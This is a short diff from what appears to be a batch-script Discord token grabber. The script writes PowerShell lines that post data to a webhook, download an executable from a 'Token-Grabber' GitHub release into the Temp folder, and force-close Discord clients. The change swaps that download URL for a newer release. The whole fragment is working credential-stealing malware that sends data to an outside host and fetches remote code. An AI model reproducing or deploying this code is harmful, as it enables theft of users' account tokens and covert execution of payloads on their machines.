@@ -98,7 +98,7 @@ echo     } >> powershell.ps1
 echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
 echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell.ps1
 echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
-echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
+echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
 echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
